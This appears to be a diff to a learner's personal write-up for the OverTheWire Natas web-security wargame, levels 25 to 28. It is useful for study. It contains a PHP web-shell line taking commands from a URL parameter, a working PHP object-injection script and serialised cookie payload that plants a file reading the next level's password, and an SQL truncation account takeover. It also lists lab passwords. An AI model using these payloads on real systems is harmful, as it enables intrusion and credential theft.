@@ -497,6 +497,7 @@ I do remember something with the user agent, but I am not going to do it now. I 
 
 /?lang=....//logs/natas25_srjojurrnasl91j7q63c9fo6dt.log
 
+`<?php echo "PWNED"; ?>`
 `<?php system($_GET['cmd']); ?>`
 
 request:
@@ -518,4 +519,152 @@ bruh. tough level. I should keep in mind that RCE backdoor cmd thingie. Windows 
 I use chat for syntax. I did understand the exploit, just I didnt remember the exact syntex to do it.
 
 ###### natas26
+natas26
+3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT
 
+(1.7.26 10:00)
+We have a program that prints line.
+I remember or at least think that the exploit lies in the php object behavior. It takes input for messages to be written in the log. I can perhaps create an object, somehow and put code injection in.
+I just don't know how...
+I am reading through this: [PHP Object Injection | OWASP Foundation](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
+And this: [What is Object Injection? Exploitations and Security Tips](https://www.vaadata.com/en/blog/what-is-object-injection-exploitations-and-security-best-practices/)
+This is hard. I wont just give up though. I am going to solve it by myself.
+
+Ok. After a few hours I came up with this:
+a:2:{i:0;a:4:{s:2:"x1";s:2:"10";s:2:"y1";s:2:"10";s:2:"x2";s:3:"200";s:2:"y2";s:3:"200";}i:1;O:6:"Logger":3:{s:15:"%00Logger%00logFile";s:21:"/tmp/natas26_test.log";s:15:"%00Logger%00initMsg";s:21:"my custom start text";s:15:"%00Logger%00exitMsg";s:47:"readfile('../../../etc/natas_webpass/natas27');";}
+
+with null bytes instead of %00:
+
+a:2:{i:0;a:4:{s:2:"x1";s:2:"10";s:2:"y1";s:2:"10";s:2:"x2";s:3:"200";s:2:"y2";s:3:"200";}i:1;O:6:"Logger":3:{s:15:"�Logger�logFile";s:21:"/tmp/natas26_test.log";s:15:"�Logger�initMsg";s:21:"my custom start text";s:15:"�Logger�exitMsg";s:47:"readfile('../../../etc/natas_webpass/natas27');";}
+
+I will try to inject to the cookie it and LFI the image to show the log maybe?
+
+These didn't work. I ended up using this php script to generate a well-formed cookie. Mine were not working due to the null bytes. Don't use online tools...
+
+
+`<?php`
+
+`class Logger {`
+    `private $logFile;`
+    `private $initMsg;`
+    `private $exitMsg;`
+
+    `public function __construct() {`
+        `$this->logFile = "/tmp/natas26_test.log";`
+        `$this->initMsg = "my custom start text";`
+        `$this->exitMsg = "readfile('../../../etc/natas_webpass/natas27');";`
+    `}`
+`}`
+
+`$data = [`
+    `[`
+        `"x1" => "10",`
+        `"y1" => "10",`
+        `"x2" => "200",`
+        `"y2" => "200"`
+    `],`
+    `new Logger()`
+`];`
+
+`$serialized = serialize($data);`
+`$cookie = urlencode(base64_encode($serialized));`
+
+`// echo $serialized . PHP_EOL;`
+`echo $cookie . PHP_EOL;`
+`?>`
+YToyOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjEwIjtzOjI6InkxIjtzOjI6IjEwIjtzOjI6IngyIjtzOjM6IjIwMCI7czoyOiJ5MiI7czozOiIyMDAiO31pOjE7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyMToiL3RtcC9uYXRhczI2X3Rlc3QubG9nIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MjA6Im15IGN1c3RvbSBzdGFydCB0ZXh0IjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NDc6InJlYWRmaWxlKCcuLi8uLi8uLi9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI2Jyk7Ijt9fQ%3D%3D
+
+This time, no errors. But how to I see the log?
+
+Well, I am going to look at a walkthrough. I am just a step away from understanding it.
+I read the walkthrough, I was so close!
+All I needed to do was create a file instead of the log file. Here is the updated php code.
+All is needed to change is the user personal cookie and to replace this cookie with the drawing cookie.
+
+
+`<?php`
+
+`class Logger {`
+    `private $logFile;`
+    `private $initMsg;`
+    `private $exitMsg;`
+
+    `public function __construct() {`
+        `$this->logFile = "/var/www/natas/natas26/img/natas26_90kbei8hk7gm0ebqst6sd3vh4d.php";`
+        `$this->initMsg = "my custom start text";`
+        `$this->exitMsg = "<?php readfile('/etc/natas_webpass/natas27'); ?>";`
+    `}`
+`}`
+
+`$data = [`
+    `[`
+        `"x1" => "10",`
+        `"y1" => "10",`
+        `"x2" => "200",`
+        `"y2" => "200"`
+    `],`
+    `new Logger()`
+`];`
+
+`$serialized = serialize($data);`
+`$cookie = urlencode(base64_encode($serialized));`
+
+`// echo $serialized . PHP_EOL;`
+`echo $cookie . PHP_EOL;`
+`?>`
+
+http://natas26.natas.labs.overthewire.org/img/natas26_90kbei8hk7gm0ebqst6sd3vh4d.php
+
+readfile('../../../etc/natas_webpass/natas27');readfile('../../../etc/natas_webpass/natas27');  
+**Warning**: readfile(../../../etc/natas_webpass/natas27): failed to open stream: No such file or directory in **/var/www/natas/natas26/img/natas26_90kbei8hk7gm0ebqst6sd3vh4d.php** on line **1**  
+  
+**Warning**: readfile(../../../etc/natas_webpass/natas27): failed to open stream: No such file or directory in **/var/www/natas/natas26/img/natas26_90kbei8hk7gm0ebqst6sd3vh4d.php** on line **1**  
+mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV
+
+###### natas27
+natas27
+mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV
+(5.7.26 16:05)
+
+I have been seating on this for like an hour. I understand that only the first 64 chars matter. But I can try to input something like natas28+++...++a and because of all the spaces it will only catch the natas28.
+
+I try with:
+username: natas28                                                                       a
+password: password
+
+It seems like I can create another account with the exact username but a different password.
+
+[Web Security Study Notes](https://blog.lyc8503.net/en/post/web-security/#SQL-Truncation)
+## SQL Truncation
+
+Suppose the username field in the database is defined as `varchar(32)`.
+
+Assume there’s already an admin user named `admin`.
+
+Now, a new user tries to register with the username: `admin x`.
+
+The “admin” plus 27 spaces fills exactly 32 characters. During username uniqueness checks, the server sees `admin x` as a new name and allows registration. However, when inserting into the database, the input gets **truncated**—the trailing “x” is dropped, and trailing spaces are stripped. The final stored username becomes `admin`, conflicting with the existing admin account. This can lead to authentication or authorization bugs.
+
+The root cause: many SQL servers default to silently truncating overly long inputs (issuing a warning but allowing the operation to succeed).
+
+Any field requiring uniqueness may be vulnerable to SQL truncation.
+
+Defense: **Validate input length on the backend**, or configure the SQL server to **strict mode**, turning truncation warnings into errors.
+
+19:54
+I am also trying 
+natas28                                                         x
+which is exactly 65 chars long. I am able to create it again and again but not log into it.
+I trying using the browser, using burp suite. I remember watching a walkthrough back then, but I honestly don't remember hoe to solve it besides the theory in general.
+OK. Now it worked.
+I created an account with the creds above with password as "password".
+Then I tried to create the same account to log in. Once with the x, once without. On the repeater. Now it worked...
+Welcome natas28 !  
+Here is your data:  
+Array ( [username] => natas28 [password] => Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3 )
+I did this multiple times. If it works, it works I GUESS...
+Also worked in the browser.
+IDK!
+###### natas28
+natas28
+Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3
